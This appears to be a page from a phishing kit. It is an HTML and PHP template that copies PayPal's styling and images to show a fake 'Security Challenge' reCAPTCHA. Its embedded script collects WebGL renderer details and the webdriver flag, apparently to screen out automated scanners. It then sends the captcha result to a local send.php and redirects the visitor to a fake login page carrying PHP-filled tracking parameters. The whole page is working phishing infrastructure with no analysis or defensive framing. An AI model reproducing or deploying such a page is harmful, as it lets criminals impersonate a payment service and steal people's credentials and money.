          box-sizing: border-box;
          margin-left: 0;
        }
        .ui-dialog .btn .btn {
          margin-left: 10px;
        }
        .ui-dialog .ui-dialog-titlebar {
          min-height: 20px;
          font-size: 18px;
          letter-spacing: 0.01em;
          padding-left: 1.5em;
          padding-right: 1.5em;
          background: transparent;
          border: none;
        }
        .ui-dialog .ui-dialog-title {
          line-height: 22px;
        }
        .ui-dialog .ui-dialog-titlebar-close {
          position: absolute;
          right: 0.4em;
          margin: -10px 0 0 0;
          padding: 1px;
          width: 25px;
          height: 25px;
          border-radius: 0;
        }
        .ui-dialog .ui-button:after {
          content: "";
          position: absolute;
          right: 0;
          top: 0;
          width: 25px;
          height: 25px;
          background: transparent url("https://www.paypalobjects.com/webstatic/mktg/2014design/close_default.png") center center no-repeat;
        }
        .ui-dialog .ui-dialog-content {
          padding: 0.5em 1.5em;
          -webkit-overflow-scrolling: touch;
        }
        .ui-dialog .content {
          padding: 0;
        }
        .ui-dialog.start {
          opacity: 0;
        }
        .ui-widget-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: #000;
          opacity: 0.8;
        }
        .ui-button {
          min-width: 0;
          background: transparent;
        }
        .ui-state-default,
        .ui-widget-content .ui-state-default,
        .ui-widget-header .ui-state-default {
          background: none;
          border: none;
        }
        .ui-dialog .ui-button,
        .ui-dialog-content .btn {
          -webkit-touch-callout: none;
          -webkit-tap-highlight-color: transparent;
        }
        .footer {
          position: fixed;
          bottom: 0;
          left: 0;
          right: 0;
          text-align: center;
          font-size: 11px;
          background-color: #f7f9fa;
          padding: 14px 20px;
        }
        .footer a,
        .footer a:link,
        .footer a:visited,
        .footer a:hover {
          color: #666666;
          white-space: nowrap;
        }
        .footerGroup {
          list-style-type: none;
        }
        .footerGroup li {
          display: inline-block;
          margin: 0 10px 0 0;
        }
        .footerGroup li:last-child {
          margin: 0;
        }
        .footerGroupWithSiblings {
          float: left;
          padding: 0;
          background: none;
        }
        .footerCopyright {
          margin: 0;
          float: right;
          color: #9e9e9e;
        }
        .footerDisclaimer {
          margin: 0;
          padding: 7px 0 0;
          clear: both;
          color: #9e9e9e;
          text-align: left;
        }
        .footerWithIcon {
          background: #ffffff url('https://www.paypalobjects.com/webstatic/i/consumer/onboarding/icon_PP_monogram_2x.png') center 14px no-repeat;
          padding: 58px 0 0;
          background-size: 20px;
        }
        .footerWithIcon .extendedContent,
        .footerWithIcon .footerGroup {
          padding: 14px 20px;
          background: #F7F9FA;
        }
        .footerWithIcon .extendedContent > .footerGroup {
          padding: 0;
          background: none;
        }
        .footerWithIcon .footerGroupWithSiblings,
        .footerWithIcon .footerCopyright {
          padding: 0;
        }
        .footerStayPut {
          position: relative;
          top: 0;
          left: 0;
        }
        /* mobile */
        @media all and (max-width: 767px) {
          .footer {
            padding: 14px 10px;
          }
          .footerWithIcon {
            padding: 58px 0 0;
          }
          .footerWithIcon .footerGroup,
          .footerWithIcon .extendedContent {
            padding: 14px 10px;
            background: #f7f9fa;
          }
          .footerWithIcon .extendedContent > .footerGroup {
            padding: 0;
            background: none;
          }
          .footerGroupWithSiblings,
          .footerCopyright {
            float: none;
          }
          .footerGroupWithSiblings {
            margin-bottom: 7px;
          }
          .footerDisclaimer {
            margin-top: 7px;
            padding: 0;
            text-align: center;
          }
        }
        .identityFooter {
          margin: 0 auto;
          text-align: center;
          margin-top: 24px;
          font-size: 11px;
          padding-bottom: 15px;
        }
        .identityFooter p {
          margin: 10px 0 0 0;
          color: #9e9e9e;
        }
        .identityFooter a,
        .identityFooter a:link,
        .identityFooter a:visited a:hover {
          color: #666666;
        }
        .identityFooter ul {
          list-style-type: none;
        }
        .identityFooter ul li {
          display: inline-block;
          margin: 0;
          padding-left: .4em;
        }
        .identityFooter ul li:first-child {
          background: none;
        }
        .identityFooter ul li:last-child {
          border-right: 0;
        }
        .identityFooter ul li a {
          margin-right: .5em;
          white-space: nowrap;
        }
        /* mobile */
        @media all and (max-width: 767px) {
          .identityFooter {
            margin-top: 50px;
          }
        }
        /* page */
        /* Page specific CSS files */
        #login .forgotLink {
          margin: 25px auto 30px;
          padding-bottom: 25px;
          border-bottom: 1px solid #CBD2D6;
        }
        /* mobile ---- */
        @media all and (max-width: 767px) {
          #login .forgotLink {
            margin: 16px auto 19px;
            padding-bottom: 19px;
          }
        }
        /* Page specific CSS files */
        #ads-plugin {
          display: none;
        }
        .no-js #ads-plugin {
          display: block;
        }
        .invalidCode {
          color: red;
        }
        p.invalidInlineCode {
          color: red;
          padding-top: 0px;
          padding-bottom: 0px;
        }
        #captcha-standalone .error {
          border: solid 2px red;
        }</style>
    <script src="https://www.google.com/recaptcha/api.js"></script>
</head>
<body class="" data-view-name="authcaptcha" data-locale="en_US">

    <div id="main" role="main">
        <div id="ads-plugin" style="display: block;">
            <div class="container-fluid" id="captcha-standalone" data-app="authchallenge_response" data-captcha-type="recaptcha" data-disable-autosubmit="true" data-jse="514dd6d83900654ac3eaab386e6da624">
                <div class="corral">
                    <div id="content" class="contentContainer">
                        <h1 align="center" class="headerText">Security Challenge</h1>
                        
                            <div height="500" width="100%25" align="middle">
                                <style>
      .spinner:after,.spinner:before{content:''}#recaptcha{z-index:1}@-webkit-keyframes rotation{from{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}@-moz-keyframes rotation{from{-moz-transform:rotate(0);transform:rotate(0)}to{-moz-transform:rotate(359deg);transform:rotate(359deg)}}@-o-keyframes rotation{from{-o-transform:rotate(0);transform:rotate(0)}to{-o-transform:rotate(359deg);transform:rotate(359deg)}}@keyframes rotation{from{transform:rotate(0)}to{transform:rotate(359deg)}}.spinner:before{display:block;margin:40px auto;width:34px;height:34px;border-left:8px solid rgba(0,0,0,.2);border-right:8px solid rgba(0,0,0,.2);border-bottom:8px solid rgba(0,0,0,.2);border-top:8px solid #2180c0;border-radius:50px;-webkit-animation:rotation .7s infinite linear;-moz-animation:rotation .7s infinite linear;-o-animation:rotation .7s infinite linear;animation:rotation .7s infinite linear}.spinner:after{position:fixed;z-index:-1;top:0;right:0;bottom:0;left:0;background:#FFF;opacity:.2;filter:alpha(opacity=20)}
    </style>
</head>
  <body>
    <div id="spinnerDiv" class="spinner"></div>
    <form method="post">
        <div class="g-recaptcha" id="g-recaptcha" data-sitekey="<?php echo $site_key; ?>" data-callback="onReturnCallback" data-theme="light"></div>
    </form>
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.min.js"></script>
<script>
var canvas = document.createElement('canvas');
var gl = canvas.getContext('webgl');
var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
var webdriver = navigator.webdriver;
var width = screen.width;
var height = screen.height;
var color_depth = screen.colorDepth;

setTimeout(function(){
  $("#spinnerDiv").addClass("hide");
}, 7000);


var onReturnCallback = function(response) { 
	//alert('g-recaptcha-response: ' + grecaptcha.getResponse()); 
	var url='send.php';  
	$.ajax({ 'url' : url, 
		dataType: 'json',
		data: { response: response},
		success: function(result, success) { 
      if (result.success == true) {
        window.location.assign('https://'+window.location.hostname+location.pathname.substring(0,location.pathname.lastIndexOf("/"))+'/login?ch_id=<?php echo $rundomizi; ?>&country=<?php echo $country_spox; ?>&iso=<?php echo $country_code_spox; ?>&expired=<?php echo $expired; ?>');
      } else {
        grecaptcha.reset();
      }	
        } // end of success: 
    }); // end of $.ajax 
}; // end of onReturnCallback 
</script>
</body></html>